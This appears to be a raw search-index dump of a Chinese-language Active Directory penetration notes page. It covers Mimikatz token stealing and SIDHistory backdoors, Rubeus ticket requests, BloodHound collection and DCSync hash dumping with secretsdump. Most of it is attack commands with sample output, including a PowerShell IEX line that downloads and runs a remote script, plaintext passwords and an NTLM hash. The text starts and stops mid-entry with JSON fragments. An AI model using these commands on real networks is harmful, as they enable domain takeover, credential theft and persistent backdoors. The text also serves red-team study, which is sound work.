\\\\exp1.com\\sysvol\\exp1.com\\Policies\\* \u5982\u83b7\u53d6\u5230\u4e86\u53ef\u4ee5\u5bf9GPO\u6709W\u6743\u9650\u7684\u8d26\u53f7\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u4fee\u6539 SharpGPOAbuse \u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u4e0b\u53d1\u7a0b\u5e8f\u3001\u6dfb\u52a0\u8ba1\u5212\u4efb\u52a1\u548c\u542f\u52a8\u811a\u672c\u4e4b\u7c7b\u7684\u64cd\u4f5c\u3002 Mimikatz \u4ee4\u724c\u6a21\u5757 token::whoami\uff1a\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b/\u7ebf\u7a0b\u7684token\u4fe1\u606f token::list\uff1a\u5217\u51fa\u5f53\u524d\u7cfb\u7edf\u4e2d\u5b58\u5728\u7684token token::elevate\uff1a\u7a83\u53d6\u5176\u4ed6\u7528\u6237\u7684token token::run\uff1a\u5229\u7528\u67d0\u7528\u6237\u6743\u9650\u8fd0\u884c\u6307\u5b9a\u7a0b\u5e8f token::revert\uff1a\u6062\u590d\u4e3a\u539f\u6765\u7684token \u4f7f\u7528TokenTest.exe\u8fdb\u884c\u4ee4\u724c\u64cd\u4f5c\uff0c\u53ef\u5347\u6743\u3001\u964d\u6743\u64cd\u4f5c\u3002 Intro: A demo written for learning windows access token. Author: @Loong716 Usage: TokenTest.exe whoami [/full] TokenTest.exe list TokenTest.exe steal <pid> <command> [/interactive | /echo] SID\u6a21\u5757 SID\u4e00\u822c\u7531\u4ee5\u4e0b\u7ec4\u6210\uff1a \u201cS\u201d\u8868\u793aSID\uff0cSID\u59cb\u7ec8\u4ee5S\u5f00\u5934 \u201c1\u201d\u8868\u793a\u7248\u672c\uff0c\u8be5\u503c\u59cb\u7ec8\u4e3a1 \u201c5\u201d\u8868\u793aWindows\u5b89\u5168\u6743\u5a01\u673a\u6784 \u201c21-1463437245-1224812800-863842198\u201d\u662f\u5b50\u673a\u6784\u503c\uff0c\u901a\u5e38\u7528\u6765\u8868\u793a\u5e76\u533a\u5206\u57df \u201c1128\u201d\u4e3a\u76f8\u5bf9\u6807\u8bc6\u7b26(RID)\uff0c\u5982\u57df\u7ba1\u7406\u5458\u7ec4\u7684RID\u4e3a512 SIDHistory\u662f\u4e3a\u4e86\u652f\u6301\u57df\u8fc1\u79fb\u51fa\u73b0\u7684\uff0cobjectSid\u548cSIDHistory\u4e3a\u540c\u7c7b\u578b\u6570\u636e\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u7684SIDHistory\u662f\u5176\u4ed6\u7528\u6237\u7684objectSid\u65f6\uff0c\u8fd9\u4e2a\u7528\u6237\u5c31\u5177\u6709\u5176\u4ed6\u7528\u6237\u7684\u6743\u9650\u3002 \u4fee\u6539SIDHistory\u53ef\u7528\u6765\u7559\u540e\u95e8 sid::lookup \u8be5\u529f\u80fd\u5b9e\u73b0SID\u4e0e\u5bf9\u8c61\u540d\u4e4b\u95f4\u7684\u76f8\u4e92\u8f6c\u6362\uff0c\u6709\u4e09\u4e2a\u53c2\u6570\uff1a /name\uff1a\u6307\u5b9a\u5bf9\u8c61\u540d\uff0c\u5c06\u5176\u8f6c\u6362\u4e3aSID /sid\uff1a\u6307\u5b9aSID\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u5bf9\u8c61\u540d /system\uff1a\u6307\u5b9a\u67e5\u8be2\u7684\u76ee\u6807\u8ba1\u7b97\u673a sid::query \u8be5\u529f\u80fd\u652f\u6301\u901a\u8fc7SID\u6216\u5bf9\u8c61\u540d\u6765\u67e5\u8be2\u5bf9\u8c61\u7684\u4fe1\u606f\uff0c\u540c\u6837\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u4f7f\u7528\u65f6\u6307\u5b9a/sam\u6216/sid\uff0c/system\u53ef\u9009 /sam\uff1a\u6307\u5b9a\u8981\u67e5\u8be2\u5bf9\u8c61\u7684sAMAccountName /sid\uff1a\u6307\u5b9a\u8981\u67e5\u8be2\u5bf9\u8c61\u7684objectSid /system\uff1a\u6307\u5b9a\u67e5\u8be2\u7684\u76ee\u6807\u57df\u63a7\uff08LDAP\uff09 sid::modify \u8be5\u529f\u80fd\u7528\u4e8e\u4fee\u6539\u4e00\u4e2a\u57df\u5bf9\u8c61\u7684SID\uff0c\u53ef\u4ee5\u4f7f\u7528\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff1a /sam\uff1a\u901a\u8fc7sAMAccountName\u6307\u5b9a\u8981\u4fee\u6539SID\u7684\u5bf9\u8c61 /sid\uff1a\u901a\u8fc7objectSid\u6307\u5b9a\u8981\u4fee\u6539SID\u7684\u5bf9\u8c61 /new\uff1a\u8981\u4fee\u6539\u5bf9\u8c61\u7684\u65b0SID \u4f7f\u7528\u8be5\u529f\u80fd\u662f\u9700\u8981\u5148\u4f7f\u7528sid::patch\u529f\u80fd\u5bf9xxxx\u8fdb\u884cpatch\uff08\u81ea\u7136\u4e5f\u9700\u8981\u5148\u5f00\u542fdebug\u7279\u6743\uff09\uff0c\u9700\u8981\u5728\u57df\u63a7\u4e0a\u6267\u884c\u3002 sid::add \u8be5\u529f\u80fd\u7528\u6765\u5411\u4e00\u4e2a\u57df\u5bf9\u8c61\u6dfb\u52a0sIDHistoy\u5c5e\u6027\uff0c\u6709\u4e24\u4e2a\u53c2\u6570\uff1a /sam\uff1a\u901a\u8fc7sAMAccountName\u6307\u5b9a\u8981\u4fee\u6539\u7684\u5bf9\u8c61 /sid\uff1a\u901a\u8fc7objectSid\u6307\u5b9a\u8981\u4fee\u6539\u7684\u5bf9\u8c61 /new\uff1a\u8981\u4fee\u6539sIDHistory\u4e3a\u54ea\u4e2a\u5bf9\u8c61\u7684SID\uff0c\u8be5\u53c2\u6570\u53ef\u6307\u5b9a\u76ee\u6807\u7684sAMAccountName\u6216objectSid\uff0c\u5f53\u6307\u5b9a\u540d\u79f0\u65f6\u4f1a\u5148\u8c03\u7528LookupAccountSid\u5c06\u5176\u8f6c\u6362\u4e3aSID \u4f7f\u7528\u8be5\u529f\u80fd\u4e5f\u8981\u5148\u6267\u884csid::patch\uff0c\u4fee\u6539\u65f6\u540c\u6837\u662f\u64cd\u4f5cLDAP\u901a\u8fc7ldap_modify_s()\u4fee\u6539\uff0c\u4e0d\u518d\u8d58\u8ff0 \u5229\u7528sIDHistory\u6765\u7559\u540e\u95e8 mimikatz # sid::patch mimikatz # sid::add /sam:a1 /new:administrator CN=a1,CN=Users,DC=exp1,DC=com name: a1 objectGUID: {366db2c4-a05a-4617-bd33-789aa90ea20f} objectSid: S-1-5-21-3280894980-4031048059-2076154112-1106 sAMAccountName: a1 * Will try to add 'sIDHistory' this new SID:'S-1-5-21-3280894980-4031048059-2076154112-500': OK! mimikatz # sid::query /sam:a1 CN=a1,CN=Users,DC=exp1,DC=com name: a1 objectGUID: {366db2c4-a05a-4617-bd33-789aa90ea20f} objectSid: S-1-5-21-3280894980-4031048059-2076154112-1106 sAMAccountName: a1 sIDHistory: [0] S-1-5-21-3280894980-4031048059-2076154112-500 ( User -- EXP1\\Administrator ) sid::clear \u8be5\u529f\u80fd\u7528\u6765\u6e05\u7a7a\u4e00\u4e2a\u5bf9\u8c61\u7684sIDHistory\u5c5e\u6027 /sam\uff1a\u8981\u6e05\u7a7asIDHistory\u7684\u5bf9\u8c61\u7684sAMAccountName /sid\uff1a\u8981\u6e05\u7a7asIDHistory\u7684\u5bf9\u8c61\u7684objectSid sid::patch \u7b2c\u4e00\u6b65\u6210\u529f\uff1a\u53ef\u4f7f\u7528add \u7b2c\u4e8c\u6b65\u6210\u529f\uff1a\u53ef\u4f7f\u7528modify \u7279\u6743\u5229\u7528 SeDebugPrivilege \u53ef\u4ee5\u5bf9\u5176\u4ed6\u7528\u6237\u8fdb\u884c\u8c03\u8bd5\uff0c\u7528\u4e8e\u63d0\u6743 SeBackupPrivilege \u53ef\u4ee5\u8fdb\u884c\u5907\u4efd\u64cd\u4f5c\uff0c\u5bf9\u6240\u6709\u6587\u4ef6\u6709\u8bfb\u53d6\u6743\u9650 SeRestorePrivilege \u53ef\u4ee5\u8fdb\u884c\u8fd8\u539f\u64cd\u4f5c\uff0c\u5bf9\u6240\u6709\u6587\u4ef6\u6709\u5199\u6743\u9650\u3002\u57df\u5185 Backup Operators \u548c Server Operators \u7ec4\u4e5f\u6709\u8be5\u6743\u9650\u3002 SeTakeOwnershipPrivilege \u4fee\u6539\u4efb\u610f\u5bf9\u8c61\u7684\u6240\u6709\u6743 SelmpersonatePrivilege \u5141\u8bb8\u8be5\u7528\u6237\u8fd0\u884c\u7684\u7a0b\u5e8f\u6a21\u62df\u5ba2\u6237\u7aef SeAssignPrimaryTokenPrivilege \u8868\u793a\u53ef\u4ee5\u4e3a\u8fdb\u7a0b\u5206\u914d\u4e3b\u4ee4\u724c SeLoadDriverPrivilege \u7528\u6765\u52a0\u8f7d\u6216\u5378\u8f7d\u8bbe\u5907\u7684\u9a71\u52a8 BloodHound BH\u53ef\u4ee5\u81ea\u52a8\u5316\u641c\u96c6\u57df\u5185\u6240\u6709\u4fe1\u606f\uff0c\u5e76\u6839\u636e\u641c\u96c6\u5230\u7684\u4fe1\u606f\u8fdb\u884c\u5206\u6790\uff0c\u7136\u540e\u63d0\u4f9b\u6709\u6548\u7684\u653b\u51fb\u8def\u5f84\u3002 \u5b89\u88c5&\u542f\u52a8 \u8be6\u7ec6\u6d41\u7a0b\u89c1 \u5b98\u65b9\u6587\u6863 \u3002\u603b\u7684\u5c31\u662f\u8981\u88c5java\u548cneoj4\uff0c\u5e76\u4e14\u6bcf\u6b21\u542f\u52a8BH\u65f6\u5148\u8981\u542f\u52a8neo4j\u3002 \u542f\u52a8neoj4 /usr/bin/neo4j console \u542f\u52a8BH\uff0c\u5728BH\u89e3\u538b\u76ee\u5f55\u76f4\u63a5\u542f\u52a8 ./BloodHound --no-sandbox neoj4\u53ef\u4ee5\u5b89\u88c5\u5728vm\u4e2d\uff0cBH\u5e73\u53f0\u53ef\u4ee5\u76f4\u63a5\u5728\u672c\u5730\u7535\u8111\u4e2d\u8fd0\u884c\uff0c\u4f46\u9700\u8981\u6539\u4e00\u4e0bneoj4\u76d1\u542c\u5730\u5740\u3002 \u5206\u6790\u5e73\u53f0 \u542f\u52a8BH\u540e\uff0c\u4f1a\u5f39\u51fa\u56fe\u5f62\u754c\u9762\u3002\u8f93\u5165neoj4\u7684\u5bc6\u7801\uff0c\u9ed8\u8ba4\u662fneoj4/neoj4\u3002 \u641c\u96c6\u4fe1\u606f \u7528PS1\u811a\u672c\u6216EXE\u641c\u96c6\uff0c\u76f4\u63a5\u8fd0\u884c\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210\u4e00\u4e2azip\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7ed5\u8fc7powershell\u7b56\u7565 PowerShell -Exec Bypass powershell IEX (New-Object Net.WebClient).DownloadString('http://1.1.1.:8000/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All SharpHound.exe -c all \u5206\u6790\u4fe1\u606f \u5de6\u4fa7\u4f1a\u663e\u793a\u8be5\u5bf9\u8c61\u7684\u5404\u79cd\u4fe1\u606f \u8ba1\u7b97\u653b\u51fb\u8def\u5f84 \u7ed9\u5b9a\u4e00\u4e2a\u8d77\u70b9\uff0c\u4e00\u4e2a\u7ec8\u70b9\uff0cBH\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8ba1\u7b97\u653b\u51fb\u8def\u5f84\u3002 \u5982\u4e0b\u56fe\u6570\u636e\u5bfc\u5165\u5b8c\u6210\u3002\u53f3\u4fa7\u662f\u57df\u7ba1\uff0c\u6211\u4eec\u7684\u6700\u7ec8\u76ee\u6807\uff0c\u5de6\u4fa7\u662f\u5bf9\u57df\u7ba1\u7ec4\u6709memberoff\u6743\u9650\u7684\uff0c\u610f\u601d\u5c31\u662f\u53ef\u4ee5\u968f\u610f\u52a0\u7528\u6237\u5230\u57df\u7ba1\u7684\u6743\u9650\u3002\u8fd9\u4e9b\u7528\u6237\u4e00\u822c\u81ea\u5df1\u5c31\u662f\u57df\u7ba1\u3002 \u5982\u6211\u4eec\u6ca1\u6709\u5de6\u4fa7\u7528\u6237\u7684\u6743\u9650\uff0c\u53ef\u4ee5\u53f3\u952e\u8bbe\u7f6e\u4ee5\u8be5\u7528\u6237\u4e3a\u76ee\u6807 \u5de6\u4e0a\u65b9\u53ef\u4ee5\u8f93\u5165\u5df2\u7ecf\u6709\u6743\u9650\u7684\u666e\u901a\u8d26\u53f7 \u7136\u540e\u653b\u51fb\u8def\u5f84\u5c31\u51fa\u6765\u4e86\u3002 \u770b\u8d77\u6765\u5f88\u4e71\uff0c\u4f46\u5e76\u975e\u5982\u6b64\u3002 canrdp\uff0c\u6307\u7528\u6237\u53ef\u4ee5\u767b\u5f55\u7684\u673a\u5668 has session\uff0c\u6307\u8be5\u673a\u5668\u5b58\u6709\u53f3\u4fa7\u7528\u6237\u7684\u4f1a\u8bdd\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7a83\u53d6token\u6216\u5bc6\u7801 \u5f53\u4e0d\u77e5\u9053\u8fd9\u4e00\u6b65\u9aa4\u662f\u4ec0\u4e48\u610f\u601d\u6216\u5982\u4f55\u5229\u7528\u65f6\uff0c\u53ef\u4ee5\u53f3\u952e\u770b\u4e00\u4e0bhelp\uff0c\u8d34\u5fc3\u7684\u662f\uff0cBH\u751a\u81f3\u5e2e\u4f60\u628a\u811a\u672c\u4e0e\u89c6\u9891\u6559\u7a0b\u90fd\u5217\u4e3e\u51fa\u6765\u4e86\u3002 Rubeus asktgt\u6a21\u5757 \u7528\u6765\u8bf7\u6c42tgt\u7968\u636e\uff0c\u53ef\u4ee5\u4f7f\u7528\u660e\u6587\u6216\u5404\u79cd\u7c7b\u578bhash \u7533\u8bf7\u7968\u636e Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/outfile:FILENAME] [/ptt] [/luid] [/nowrap] [/opsec] \u5b9e\u4f8b rubeus asktgt /user:administrator /password:Aa123123.. /domain:exp1.com /dc:192.168.14.100 /ptt \u5229\u7528\u7533\u8bf7\u7684tgt\u6765\u6267\u884c\u7a0b\u5e8f Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> /createnetonly:C:\\Windows\\System32\\cmd.exe [/show] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/opsec] [/nopac] \u5b9e\u4f8b rubeus asktgt /user:administrator /password:Aa123123.. /domain:exp1.com /dc:192.168.14.100 /createnetonly:C:\\a.exe Impacket\u811a\u672c\u8bf4\u660e \u642d\u4e00\u4e2asmb\u670d\u52a1 python3 smbserver.py share / -smb2support \u4f7f\u7528WQL\u67e5\u8be2 python3 wmiquery.py exp1/administrator:Aa123123..@192.168.14.100 \u67e5\u8be2IP Select IPAddress,Description,DefaultIPGateway,IPSubnet,DNSHostName,DNSDomain,MACAddress from Win32_NetworkAdapterConfiguration \u67e5\u8be2\u57df\u4fe1\u606f WQL> select Name,Domain,DomainRole,UserName from Win32_ComputerSystem | Domain | DomainRole | Name | UserName | | exp1.com | 5 | DC | EXP1\\Administrator | \u57df\u89d2\u8272\uff1a0-1\u662fPC\uff0c2-3\u662fServer\uff0c4-5\u662f\u57df\u63a7 \u67e5\u8be2\u7ec4\u4fe1\u606f select * from Win32_Group \u67e5\u8be2\u81ea\u542f\u52a8\u9879\u76ee select * from Win32_StartupCommand ping\u4e00\u4e2a\u5730\u5740 \u5bf9\u6bd4\u53d1\u5305\u548c\u8fd4\u56de\u5305\u7684\u5927\u5c0f\u6765\u786e\u5b9a\u662f\u5426ping\u901a WQL> Select BufferSize,ReplySize from Win32_PingStatus where Address = '192.168.14.2' | BufferSize | ReplySize | | 32 | 32 | \u67e5\u8be2\u8fdb\u7a0b Select Name,ProcessId,ExecutablePath from Win32_Process \u53c2\u8003 UserAccountControl\u503c\u53c2\u8003\u8868 \u6765\u6e90http://woshub.com/decoding-ad-useraccountcontrol-value/ \u81ea\u5df1\u7ffb\u8bd1\u7684\uff0c\u53ef\u80fd\u4e0d\u592a\u5bf9 | SCRIPT | 1 | \u8fd0\u884c\u767b\u5f55\u811a\u672c | |:------------------------------:| -------- | ----------------- | | ACCOUNTDISABLE | 2 | \u8d26\u53f7\u5df2\u7981\u7528 | | HOMEDIR_REQUIRED | 8 | \u4f9d\u8d56\u5bb6\u76ee\u5f55 | | LOCKOUT | 16 | \u8d26\u6237\u5df2\u9501\u5b9a | | PASSWD_NOTREQD | 32 | \u4e0d\u9700\u5bc6\u7801 | | PASSWD_CANT_CHANGE | 64 | \u7528\u6237\u4e0d\u80fd\u66f4\u6539\u5bc6\u7801 | | ENCRYPTED_TEXT_PWD_ALLOWED | 128 | \u4f7f\u7528\u53ef\u9006\u52a0\u5bc6\u5b58\u50a8\u5bc6\u7801 | | TEMP_DUPLICATE_ACCOUNT | 256 | \u7528\u6237\u7684\u5e10\u6237\uff0c\u5176\u4e3b\u8981\u5e10\u6237\u5728\u53e6\u4e00\u4e2a\u57df\u4e2d | | NORMAL_ACCOUNT | 512 | \u9ed8\u8ba4\u5e10\u6237\uff0c\u5178\u578b\u7684\u6d3b\u52a8\u5e10\u6237 | | INTERDOMAIN_TRUST_ACCOUNT | 2048 | \u57df\u95f4\u4fe1\u4efb | | WORKSTATION_TRUST_ACCOUNT | 4096 | \u5de5\u4f5c\u7ec4\u4fe1\u4efb | | SERVER_TRUST_ACCOUNT | 8192 | \u670d\u52a1\u5668\u4fe1\u4efb | | DONT_EXPIRE_PASSWORD | 65536 | \u5bc6\u7801\u672a\u8fc7\u671f\u7684\u7528\u6237\u5e10\u6237 | | MNS_LOGON_ACCOUNT | 131072 | \u8981\u767b\u5f55\u7f51\u7edc\uff0c\u7528\u6237\u9700\u8981\u667a\u80fd\u5361 | | SMARTCARD_REQUIRED | 262144 | \u9700\u8981\u667a\u80fd\u5361 | | TRUSTED_FOR_DELEGATION | 524288 | \u975e\u7ea6\u675f\u59d4\u6d3e | | NOT_DELEGATED | 1048576 | | | USE_DES_KEY_ONLY | 2097152 | \u4ec5\u4f7f\u7528DES\u5bc6\u7801 | | DONT_REQ_PREAUTH | 4194304 | \u4e0d\u9700\u8981Kerberos\u9884\u8eab\u4efd\u9a8c\u8bc1 | | PASSWORD_EXPIRED | 8388608 | \u7528\u6237\u5bc6\u7801\u5df2\u8fc7\u671f | | TRUSTED_TO_AUTH_FOR_DELEGATION | 16777216 | \u7ea6\u675f\u59d4\u6d3e | | PARTIAL_SECRETS_ACCOUNT | 67108864 | \u53d7\u4fdd\u62a4\u7684\u8d26\u6237 | \u666e\u901aACE\u7684\u7f29\u5199\u53c2\u8003 | \u7f29\u5199 | \u5168\u79f0 | \u610f\u4e49 | | ------------- |:------------- | --- | | FC | full rights | \u6240\u6709 | | CR CHILD | create child | \u65b0\u5efa | | DEL CHILD | delete child | \u5220\u9664 | | LIST CHILDREN | list children | \u67e5\u770b | | SELF WRT | | \u5199\u5165 | | READ PROP | | \u8bfb | | | | | \u540e\u7eed\u518d\u8865\u5145\u8865\u5145\u3002 /id\uff1a\u6307\u5b9a\u76ee\u6807token\u7684TokenID /domainadmin\uff1a\u7a83\u53d6\u57df\u7ba1\u7684token /enterpriseadmin\uff1a\u7a83\u53d6\u4f01\u4e1a\u7ba1\u7406\u5458\u7684token /admin\uff1a\u7a83\u53d6\u672c\u5730\u7ba1\u7406\u5458\u7684token /localservice\uff1a\u7a83\u53d6Local Service\u6743\u9650\u7684token /networkservice\uff1a\u7a83\u53d6Network Service\u6743\u9650\u7684token /system\uff1a\u7a83\u53d6SYSTEM\u6743\u9650\u7684token","title":"\u57df\u6e17\u900f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#date-2021-03-26-130112","text":"","title":"date: 2021-03-26 13:01:12"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_1","text":"","title":"\u4fe1\u606f\u641c\u96c6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adsearch","text":"sharpcollection \u5229\u7528ldap\u534f\u8bae\u6765\u67e5\u8be2AD\u4fe1\u606f,\u4e3b\u8981\u67e5\u8be2groups,users,computers\u597d\u7528,\u5206\u522b\u4f7f\u7528-G -U -C\u6765\u67e5\u8be2. \u4f7f\u7528-f\u6765\u83b7\u53d6\u5b8c\u6574\u4fe1\u606f; \u4f7f\u7528--attributes\u6765\u6839\u636e-f\u5b8c\u6574\u4fe1\u606f\u8fdb\u884c\u8fc7\u6ee4,\u9ed8\u8ba4\u663e\u793acn \u57df\u5916\u4f7f\u7528-u\u548c-p\u6765\u6307\u5b9a\u4e00\u4e2a\u57df\u7528\u6237\u4ee5\u4fbf\u57df\u5916\u67e5\u8be2 \u4f7f\u7528--port\u6765\u6307\u5b9a\u4f7f\u7528ldap(389)\u6216ldaps(636) \u4f7f\u7528-d\u6765\u6307\u5b9a\u57df","title":"ADSearch"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adcollector","text":"\u8f7b\u91cf\u5316\u57df\u4fe1\u606f\u641c\u96c6\uff0c\u76f4\u63a5\u5185\u5b58\u52a0\u8f7d\u8fd0\u884c","title":"ADCollector"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_2","text":"ipconfig /all net time /domain wmic computersystem get bootupstate,username,totalphysicalmemory,systemtype,systemfamily,domain,dnshostname ,oemstringarray /value","title":"\u662f\u5426\u5904\u4e8e\u57df\u73af\u5883"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dn","text":"DN\u67e5\u8be2 wmic /Namespace:\\\\root\\directory\\ldap path ds_domain get ds_distinguishedname,ds_dc /value","title":"\u67e5\u8be2DN"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dns","text":"\u9700\u8981\u5728\u57df\u63a7\u4e0a\u6267\u884c Dnscmd . /ZonePrint exp.com","title":"\u547d\u4ee4\u884c\u67e5\u770bDNS\u89e3\u6790\u8bb0\u5f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_3","text":"net view /domain","title":"\u6709\u51e0\u4e2a\u57df"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_4","text":"\u57df\u5185\u7684\u57df\u63a7\u90fd\u5728Domain Controller\u8fd9\u4e2aOU\u5e95\u4e0b \u8981\u67e5\u8be2\u5176\u4ed6\u7684\u57df\uff0c/domain\u540e\u8ddf:abc.com\u5c31\u884c net group \"domain controllers\" /domain \u67e5\u57df\u63a7 wmic /Namespace:\\\\root\\directory\\ldap path ds_computer where ds_useraccountcontrol=532480 get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem \u8fd8\u53ef\u4ee5\u7528adfind\uff0c\u6307\u5b9a\u6839\u57dfDN\u5c31\u884c\u4e86\uff1b\u6216\u8005\u76f4\u63a5dcdmp AdFind.exe -b \"OU=Domain Controllers,DC=exp,DC=com\" -f \"(objectclass=computer)\" -dn adfind.exe -sc dcdmp -dn nslookup\u67e5\u8be2 Nslookup -type=SRV _ldap._tcp","title":"\u57df\u63a7\u662f\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_5","text":"nltest /domain_trusts","title":"\u57df\u4fe1\u4efb\u5982\u4f55"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_6","text":"\u6ce8\u610f\uff1a\u57df\u63a7\u4e0e\u57df\u7ba1\u662f\u4e24\u4e2a\u4e0d\u540c\u7684\u6982\u5ff5\uff0c\u57df\u63a7\u6307\u7684\u673a\u5668/\u673a\u5668\u7528\u6237\uff0c\u57df\u7ba1\u6307\u7684\u57df\u7528\u6237\u3002 \u57df\u7528\u6237\u5168\u90e8\u5c5e\u4e8e\u6210\u5458\u7528\u6237\uff0c\u673a\u5668\u7528\u6237\u662f\u4ee5\u673a\u5668\u540d\u540e\u9762\u52a0$\u6765\u547d\u540d\u7684\u3002\u666e\u901a\u7684\u57df\u7528\u6237\u53ef\u4ee5\u5728\u57df\u5185\u4efb\u610f\u4e00\u53f0\u540c\u7b49\u6743\u9650\u7684\u673a\u5668\u4e0a\u767b\u5f55\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff09\uff0c\u6240\u4ee5\u57df\u7528\u6237\u4e0d\u80fd\u4ee3\u8868\u90a3\u53f0\u7279\u5b9a\u7684\u673a\u5668\uff1b\u673a\u5668\u7528\u6237\u662f\u8be5\u53f0\u57df\u5185\u673a\u5668\u7684\u7ba1\u7406\u5458\u6743\u9650\u7528\u6237\uff0c\u6240\u4ee5\u673a\u5668\u7528\u6237\u4ee3\u8868\u4e86\u90a3\u53f0\u7279\u5b9a\u7684\u673a\u5668\u3002 net group \"domain admins\" /domain","title":"\u57df\u7ba1\u662f\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_7","text":"net localgroup administrators /domain","title":"\u57df\u7ba1\u7ec4\u6709\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_8","text":"net group \"enterprise admins\" /domain","title":"\u7ec4\u5185\u6210\u5458\u662f\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_9","text":"net group /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_group get DS_cn,ADSIPath,DS_description \u8fd8\u53ef\u4ee5\u7528adfind\uff0cadfind\u6709\u5f88\u591a\u5f3a\u5927\u7684\u547d\u4ee4\uff0c\u8fd9\u4e2a\u4ee5\u540e\u518d\u7814\u7a76\u6574\u7406\u5427 AdFind.exe -sc oudmp -dn","title":"\u57df\u7ec4\u67e5\u8be2"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_10","text":"net accounts /domain","title":"\u57df\u5bc6\u7801\u7b56\u7565\u662f\u4ec0\u4e48"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_11","text":"net group \"domain computers\" /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_computer get ds_cn,ds_useraccountcontrol,ds_dnshostname,ds_operatingsystem","title":"\u57df\u5185\u673a\u5668\u6709\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_12","text":"KrbRelayUp.exe relay -domain exp1.com -CreateNewComputerAccount -ComputerName abc$ -ComputerPassword Aa123123. \u8fd8\u53ef\u7528adfind\uff0c\u53ef\u4ee5\u901a\u8fc7objectclass=Computer\u6216\u8005objectcategory=Computer\u67e5\u627e\u57df\u5185\u7684\u6240\u6709\u673a\u5668 AdFind.exe -f \"(objectcategory=computer)\" -dn ldapsearch -x -h 10.1.1.1 -D \"zhangs@exp.com\" -b \"DC=dc,DC=exp,DC=com\" -w \"123456\" \"objectclass=Computer\" | grep sAMAccountName","title":"\u57df\u5185\u63d0\u6743"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dcsync","text":"impacket\u5bfc\u51fa\u7684\u683c\u5f0f\u66f4\u4fbf\u4e8e\u9605\u8bfb python secretsdump.py exp.com/cs:123456@dc.exp.com -dc-ip 10.0.2.254 -just-dc-user administrator secretsdump.py exp1.com/dc\\$@192.168.14.100 -hashes :eebbbd6dd1dc5bdc02b26bd6f74bee8f -just-dc dcsync exp.com mimikatz.exe privilege::debug \"lsadump::dcsync /domain:test.com /user:xx /password:12323 /all /csv\" exit","title":"DCSYNC"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dns_1","text":"\u67e5\u770bdns\u533a\u57df dnscmd /EnumZones \u663e\u793a\u8be6\u7ec6 dnscmd /zoneprint xx.com \u4f7f\u7528SharpAdidnsdump.exe \u5728\u666e\u901a\u57df\u7528\u6237\u7684\u60c5\u51b5\u53ef\u4ee5\u5bfc\u51fadns SharpAdidnsdump.exe dc","title":"DNS\u4fe1\u606f\u5bfc\u51fa"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_13","text":"\u6dfb\u52a0\u4e00\u4e2a\u57df\u7528\u6237\u5e76\u5c06\u7528\u6237\u52a0\u5165\u57df\u7ba1\u7ec4 dsadd user 